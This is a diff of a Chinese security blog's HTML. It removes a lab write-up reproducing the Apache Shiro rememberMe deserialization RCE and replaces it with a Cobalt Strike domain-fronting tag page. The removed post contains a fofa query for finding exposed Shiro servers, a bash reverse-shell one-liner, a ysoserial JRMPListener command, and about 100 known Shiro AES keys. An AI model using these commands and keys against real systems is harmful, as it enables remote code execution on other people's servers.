@@ -6,26 +6,15 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>漏洞复现-shiro反序列 | 腾小飞的博客</title>
+  <title>Tag: cobaltstrike | 腾小飞的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="摘要Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API,您可以快速、轻松地获得任何应用程序,从最小的移动应用程序到最大的网络和企业应用程序。 Apache Shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值 &gt; Base64解码–">
-<meta property="og:type" content="article">
-<meta property="og:title" content="漏洞复现-shiro反序列">
-<meta property="og:url" content="http://yoursite.com/2020/06/01/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-shiro%E5%8F%8D%E5%BA%8F%E5%88%97/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="腾小飞的博客">
+<meta property="og:url" content="http://yoursite.com/tags/cobaltstrike/index.html">
 <meta property="og:site_name" content="腾小飞的博客">
-<meta property="og:description" content="摘要Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API,您可以快速、轻松地获得任何应用程序,从最小的移动应用程序到最大的网络和企业应用程序。 Apache Shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值 &gt; Base64解码–">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200601162616840.png">
-<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200601165632594.png">
-<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200601165707739.png">
-<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200601170510156.png">
-<meta property="article:published_time" content="2020-06-01T07:20:25.000Z">
-<meta property="article:modified_time" content="2020-06-23T02:36:47.989Z">
 <meta property="article:author" content="腾小飞的博客">
-<meta property="article:tag" content="exp">
-<meta property="article:tag" content="shiro反序列">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200601162616840.png">
   
     <link rel="alternative" href="/atom.xml" title="腾小飞的博客" type="application/atom+xml">
   
@@ -151,95 +140,56 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-漏洞复现-shiro反序列" class="article article-type-post " itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
+            
   
-    <h1 class="article-title" itemprop="name">
-      漏洞复现-shiro反序列
+  
+    
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2020" class="archive-year">2020</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/2020/06/22/cobaltstrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E9%9A%90%E8%97%8F%E7%9C%9F%E5%AE%9EIP%E5%92%8C%E6%81%B6%E6%84%8F%E5%9F%9F%E5%90%8D/" class="archive-article-date">
+  	<time datetime="2020-06-22T08:34:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-06-22</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2020/06/22/cobaltstrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E9%9A%90%E8%97%8F%E7%9C%9F%E5%AE%9EIP%E5%92%8C%E6%81%B6%E6%84%8F%E5%9F%9F%E5%90%8D/">cobaltstrike域前置隐藏真实IP和恶意域名</a>
     </h1>
   
 
-        
-        <a href="/2020/06/01/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-shiro%E5%8F%8D%E5%BA%8F%E5%88%97/" class="archive-article-date">
-  	<time datetime="2020-06-01T07:20:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-06-01</time>
-</a>
-        
-    
-    
-        
-          <span class="archive-article-date">
-              阅读量 <span id="busuanzi_value_page_pv"></span>
-          </span>
-        
-    
-    
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API,您可以快速、轻松地获得任何应用程序,从最小的移动应用程序到最大的网络和企业应用程序。</p>
-<p>Apache Shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值 &gt; Base64解码–&gt;AES解密–&gt;反序列化。然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。</p>
-<a id="more"></a>
-
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Apache Shiro &lt;= 1.2.4</p>
-<h3 id="漏洞特征："><a href="#漏洞特征：" class="headerlink" title="漏洞特征："></a>漏洞特征：</h3><p>shiro反序列化的特征：在返回包的 Set-Cookie 中存在 rememberMe=deleteMe 字段</p>
-<p>fofa查询语句：app=”Apache-Shiro”</p>
-<h3 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h3><p>vulhub拉漏洞镜像，使用方法参考<a href="https://github.com/vulhub/vulhub/tree/master/shiro/CVE-2016-4437" target="_blank" rel="noopener">这里</a></p>
-<p>执行命令启动</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-
-<p>访问8080端口出现下图搭建成功</p>
-<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200601162616840.png" alt="githubimage-20200601162616840"></p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>直接使用<a href="https://github.com/wyzxxz/shiro_rce" target="_blank" rel="noopener">EXP</a>，这里选择0</p>
-<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200601165632594.png" alt="githubimage-20200601165632594"></p>
-<p>使用 <a href="http://www.dnslog.cn/" target="_blank" rel="noopener">http://www.dnslog.cn/</a> 监听</p>
-<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200601165707739.png" alt="githubimage-20200601165707739"></p>
-<p>执行以下命令，在dnslog会收到响应</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gt5uwt.dnslog.cn</span><br></pre></td></tr></table></figure>
-
-<p>反弹shell需要在<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">这里</a>编码后使用，或在这个exp中使用以下命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash&#x3D;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;0.0.0.0&#x2F;18888 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200601170510156.png" alt="githubimage-20200601170510156"></p>
-<p>选择其他接口会提示</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[-] use gadget: JRMPClient</span><br><span class="line">[*] JRMPClient command example: xx.xx.xx.xx:8888</span><br><span class="line">[-] please enter command, enter q or quit to quit, enter back to re-choose gadget</span><br></pre></td></tr></table></figure>
-
-<p>需要在vps中放入<a href="https://github.com/angelwhu/ysoserial" target="_blank" rel="noopener">ysoserial.jar</a>反序列工具，执行以下命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener3333 CommonsCollections5 &quot;ping 6vb1di.dnslog.cn&quot;</span><br></pre></td></tr></table></figure>
-
-<p>在exp中输入vps开启反序列工具后监听的端口，如果攻击成功vps会有相应的返回</p>
-<h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3><p>shiro反序列利用<a href="https://lalalaxiaoyuren.github.io/2020/04/20/shiro反序列化漏洞/" target="_blank" rel="noopener">https://lalalaxiaoyuren.github.io/2020/04/20/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>
-<p>反序列延申</p>
-<p><a href="https://mp.weixin.qq.com/s/NRx-rDBEFEbZYrfnRw2iDw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/NRx-rDBEFEbZYrfnRw2iDw</a></p>
-<h3 id="可以利用的KEY"><a href="#可以利用的KEY" class="headerlink" title="可以利用的KEY"></a>可以利用的KEY</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</span><br><span class="line">4AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">Z3VucwAAAAAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">fCq+&#x2F;xW488hMTCD+cmJ3aQ&#x3D;&#x3D;</span><br><span class="line">0AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">1AvVhdsgUs0FSA3SDFAdag&#x3D;&#x3D;</span><br><span class="line">1QWLxg+NYmxraMoxAXu&#x2F;Iw&#x3D;&#x3D;</span><br><span class="line">25BsmdYwjnfcWmnhAciDDg&#x3D;&#x3D;</span><br><span class="line">2AvVhdsgUs0FSA3SDFAdag&#x3D;&#x3D;</span><br><span class="line">3AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">3JvYhmBLUs0ETA5Kprsdag&#x3D;&#x3D;</span><br><span class="line">r0e3c16IdVkouZgk1TKVMg&#x3D;&#x3D;</span><br><span class="line">5aaC5qKm5oqA5pyvAAAAAA&#x3D;&#x3D;</span><br><span class="line">5AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">6AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">6NfXkC7YVCV5DASIrEm1Rg&#x3D;&#x3D;</span><br><span class="line">6ZmI6I2j5Y+R5aSn5ZOlAA&#x3D;&#x3D;</span><br><span class="line">cmVtZW1iZXJNZQAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">7AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">8AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">8BvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">9AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">OUHYQzxQ&#x2F;W9e&#x2F;UjiAGu6rg&#x3D;&#x3D;</span><br><span class="line">a3dvbmcAAAAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">aU1pcmFjbGVpTWlyYWNsZQ&#x3D;&#x3D;</span><br><span class="line">bWljcm9zAAAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">bWluZS1hc3NldC1rZXk6QQ&#x3D;&#x3D;</span><br><span class="line">bXRvbnMAAAAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">ZUdsaGJuSmxibVI2ZHc9PQ&#x3D;&#x3D;</span><br><span class="line">wGiHplamyXlVB11UXWol8g&#x3D;&#x3D;</span><br><span class="line">U3ByaW5nQmxhZGUAAAAAAA&#x3D;&#x3D;</span><br><span class="line">MTIzNDU2Nzg5MGFiY2RlZg&#x3D;&#x3D;</span><br><span class="line">L7RioUULEFhRyxM7a2R&#x2F;Yg&#x3D;&#x3D;</span><br><span class="line">a2VlcE9uR29pbmdBbmRGaQ&#x3D;&#x3D;</span><br><span class="line">WcfHGU25gNnTxTlmJMeSpw&#x3D;&#x3D;</span><br><span class="line">OY&#x2F;&#x2F;C4rhfwNxCQAQCrQQ1Q&#x3D;&#x3D;</span><br><span class="line">5J7bIJIV0LQSN3c9LPitBQ&#x3D;&#x3D;</span><br><span class="line">f&#x2F;SY5TIve5WWzT4aQlABJA&#x3D;&#x3D;</span><br><span class="line">bya2HkYo57u6fWh5theAWw&#x3D;&#x3D;</span><br><span class="line">WuB+y2gcHRnY2Lg9+Aqmqg&#x3D;&#x3D;</span><br><span class="line">kPv59vyqzj00x11LXJZTjJ2UHW48jzHN</span><br><span class="line">3qDVdLawoIr1xFd6ietnwg&#x3D;&#x3D;</span><br><span class="line">ZWvohmPdUsAWT3&#x3D;KpPqda</span><br><span class="line">YI1+nBV&#x2F;&#x2F;m7ELrIyDHm6DQ&#x3D;&#x3D;</span><br><span class="line">6Zm+6I2j5Y+R5aS+5ZOlAA&#x3D;&#x3D;</span><br><span class="line">2A2V+RFLUs+eTA3Kpr+dag&#x3D;&#x3D;</span><br><span class="line">6ZmI6I2j3Y+R1aSn5BOlAA&#x3D;&#x3D;</span><br><span class="line">SkZpbmFsQmxhZGUAAAAAAA&#x3D;&#x3D;</span><br><span class="line">2cVtiE83c4lIrELJwKGJUw&#x3D;&#x3D;</span><br><span class="line">fsHspZw&#x2F;92PrS3XrPW+vxw&#x3D;&#x3D;</span><br><span class="line">XTx6CKLo&#x2F;SdSgub+OPHSrw&#x3D;&#x3D;</span><br><span class="line">sHdIjUN6tzhl8xZMG3ULCQ&#x3D;&#x3D;</span><br><span class="line">O4pdf+7e+mZe8NyxMTPJmQ&#x3D;&#x3D;</span><br><span class="line">HWrBltGvEZc14h9VpMvZWw&#x3D;&#x3D;</span><br><span class="line">rPNqM6uKFCyaL10AK51UkQ&#x3D;&#x3D;</span><br><span class="line">Y1JxNSPXVwMkyvES&#x2F;kJGeQ&#x3D;&#x3D;</span><br><span class="line">lT2UvDUmQwewm6mMoiw4Ig&#x3D;&#x3D;</span><br><span class="line">MPdCMZ9urzEA50JDlDYYDg&#x3D;&#x3D;</span><br><span class="line">xVmmoltfpb8tTceuT5R7Bw&#x3D;&#x3D;</span><br><span class="line">c+3hFGPjbgzGdrC+MHgoRQ&#x3D;&#x3D;</span><br><span class="line">ClLk69oNcA3m+s0jIMIkpg&#x3D;&#x3D;</span><br><span class="line">Bf7MfkNR0axGGptozrebag&#x3D;&#x3D;</span><br><span class="line">1tC&#x2F;xrDYs8ey+sa3emtiYw&#x3D;&#x3D;</span><br><span class="line">ZmFsYWRvLnh5ei5zaGlybw&#x3D;&#x3D;</span><br><span class="line">cGhyYWNrY3RmREUhfiMkZA&#x3D;&#x3D;</span><br><span class="line">IduElDUpDDXE677ZkhhKnQ&#x3D;&#x3D;</span><br><span class="line">yeAAo1E8BOeAYfBlm4NG9Q&#x3D;&#x3D;</span><br><span class="line">cGljYXMAAAAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">2itfW92XazYRi5ltW0M2yA&#x3D;&#x3D;</span><br><span class="line">XgGkgqGqYrix9lI6vxcrRw&#x3D;&#x3D;</span><br><span class="line">ertVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">5AvVhmFLUS0ATA4Kprsdag&#x3D;&#x3D;</span><br><span class="line">s0KTA3mFLUprK4AvVhsdag&#x3D;&#x3D;</span><br><span class="line">hBlzKg78ajaZuTE0VLzDDg&#x3D;&#x3D;</span><br><span class="line">9FvVhtFLUs0KnA3Kprsdyg&#x3D;&#x3D;</span><br><span class="line">d2ViUmVtZW1iZXJNZUtleQ&#x3D;&#x3D;</span><br><span class="line">yNeUgSzL&#x2F;CfiWw1GALg6Ag&#x3D;&#x3D;</span><br><span class="line">NGk&#x2F;3cQ6F5&#x2F;UNPRh8LpMIg&#x3D;&#x3D;</span><br><span class="line">4BvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">MzVeSkYyWTI2OFVLZjRzZg&#x3D;&#x3D;</span><br><span class="line">CrownKey&#x3D;&#x3D;a12d&#x2F;dakdad</span><br><span class="line">empodDEyMwAAAAAAAAAAAA&#x3D;&#x3D;</span><br><span class="line">A7UzJgh1+EWj5oBFi+mSgw&#x3D;&#x3D;</span><br><span class="line">YTM0NZomIzI2OTsmIzM0NTueYQ&#x3D;&#x3D;</span><br><span class="line">c2hpcm9fYmF0aXMzMgAAAA&#x3D;&#x3D;</span><br><span class="line">i45FVt72K2kLgvFrJtoZRw&#x3D;&#x3D;</span><br><span class="line">U3BAbW5nQmxhZGUAAAAAAA&#x3D;&#x3D;</span><br><span class="line">ZnJlc2h6Y24xMjM0NTY3OA&#x3D;&#x3D;</span><br><span class="line">Jt3C93kMR9D5e8QzwfsiMw&#x3D;&#x3D;</span><br><span class="line">MTIzNDU2NzgxMjM0NTY3OA&#x3D;&#x3D;</span><br><span class="line">vXP33AonIp9bFwGl7aT7rA&#x3D;&#x3D;</span><br><span class="line">V2hhdCBUaGUgSGVsbAAAAA&#x3D;&#x3D;</span><br><span class="line">Z3h6eWd4enklMjElMjElMjE&#x3D;</span><br><span class="line">Q01TX0JGTFlLRVlfMjAxOQ&#x3D;&#x3D;</span><br><span class="line">ZAvph3dsQs0FSL3SDFAdag&#x3D;&#x3D;</span><br><span class="line">Is9zJ3pzNh2cgTHB4ua3+Q&#x3D;&#x3D;</span><br><span class="line">NsZXjXVklWPZwOfkvk6kUA&#x3D;&#x3D;</span><br><span class="line">GAevYnznvgNCURavBhCr1w&#x3D;&#x3D;</span><br><span class="line">66v1O8keKNV3TTcGPK1wzg&#x3D;&#x3D;</span><br><span class="line">SDKOLKn2J1j&#x2F;2BHjeZwAoQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
-
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
+        <div class="article-info info-on-right">
+          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">exp</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">cobaltstrike</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">shiro反序列</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">域前置</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Domain Fronting</a>
         		</li>
       		
 		</ul>
 	</div>
 
-      
+          
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
 		<ul class="article-tag-list">
@@ -249,131 +199,24 @@
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="/categories/渗透测试/漏洞复现//" class="article-tag-list-link color5">漏洞复现</a>
+        			<a href="/categories/渗透测试/CC加密通信//" class="article-tag-list-link color2">CC加密通信</a>
         		</li>
       		
 		</ul>
 	</div>
 
 
-      
-
-      
-        
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
         </div>
-      </div>
-    </span>
-  </div>
-</div>
-
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/06/01/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-shiro%E5%8F%8D%E5%BA%8F%E5%88%97/" alt="微信分享二维码">
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
-      
-      <div class="clearfix"></div>
-    </div>
+        <div class="clearfix"></div>
+    </header>
   </div>
 </article>
-
-  
-<nav id="article-nav">
-  
-    <a href="/2020/06/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Apache%20ActiveMQ/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          ActiveMQ 漏洞复现
-        
-      </div>
-    </a>
   
   
-    <a href="/2020/05/29/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E9%80%9A%E7%94%A8%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">渗透测试常见漏洞通用修复方法</div>
-      <i class="icon-circle-right"></i>
-    </a>
-  
-</nav>
-
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-  
-  
-  
-  <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
-<script>
-  var cloudTieConfig = {
-    url: "http://yoursite.com/2020/06/01/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-shiro%E5%8F%8D%E5%BA%8F%E5%88%97/", 
-    sourceId: "漏洞复现-shiro反序列",
-    productKey: "true",
-    target: "cloud-tie-wrapper"
-  };
-</script>
-<script src="//img1.cache.netease.com/f2e/tie/yun/sdk/loader.js"></script>
+    </div></section>
   
 
-  
-
-  
-
-  
+    
 
 
           </div>
@@ -426,9 +269,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: true,
+		isPost: false,
 		isArchive: false,
-		isTag: false,
+		isTag: true,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
